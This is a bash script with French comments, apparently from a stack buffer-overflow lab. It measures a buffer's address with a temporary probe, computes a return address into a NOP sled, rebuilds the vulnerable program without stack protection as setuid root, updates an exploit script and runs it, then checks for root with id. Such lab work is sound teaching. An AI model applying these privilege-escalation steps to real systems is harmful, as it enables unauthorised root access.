#!/bin/bash
# T3 Niveau 2 - meme principe de sonde reelle que L1. L'offset reel
# (quelque part entre 92 et 200, BUF_SIZE inconnu en theorie) est deja
# couvert par le balayage d'ecriture repetee dans exploit_L2.py ; on a
# seulement besoin que `ret` tombe dans le sled NOP avant start=450.
source "$(dirname "$0")/00_config.sh" || exit 1
sudo ln -sf /bin/zsh /bin/sh
cd "$E3" || exit 1

echo "=== Mesure reelle de &buffer (sonde temporaire, stack-L2) ==="
cp stack.c stack_probe_tmp.c
sed -i '/char buffer\[BUF_SIZE\];/a\    printf("PROBE &buffer = %p\\n", (void*)buffer); fflush(stdout);' stack_probe_tmp.c
gcc -DBUF_SIZE=160 -m32 -z execstack -fno-stack-protector -o stack-L2 stack_probe_tmp.c
touch badfile
PROBE_OUT=$(timeout 2 ./stack-L2 2>&1)
BUF_HEX=$(echo "$PROBE_OUT" | grep -oE '0x[0-9a-fA-F]+' | tail -1)
rm -f stack_probe_tmp.c
echo "&buffer mesure = $BUF_HEX"

if [ -z "$BUF_HEX" ]; then
  echo "ERREUR : sonde n'a rien mesure."
  exit 1
fi

RET_HEX=$(python3 -c "print(hex($BUF_HEX + 300))")
echo "ret calcule = $RET_HEX (sled avant start=450)"

echo "=== Reconstruction du binaire PROPRE + setuid root ==="
gcc -DBUF_SIZE=160 -m32 -z execstack -fno-stack-protector -o stack-L2 stack.c
sudo chown root stack-L2
sudo chmod 4755 stack-L2

echo "=== Mise a jour d'exploit_L2.py avec le ret mesure ==="
sed -i -E "s/^ret[[:space:]]*=.*/ret = $RET_HEX/" exploit_L2.py
grep -n "^ret\|^start_offset\|^end_offset\|^start" exploit_L2.py

echo "=== Generation du badfile + attaque ==="
python3 exploit_L2.py
./stack-L2
id
cat /proc/self/status | grep -E "^Uid|^Gid"
exit
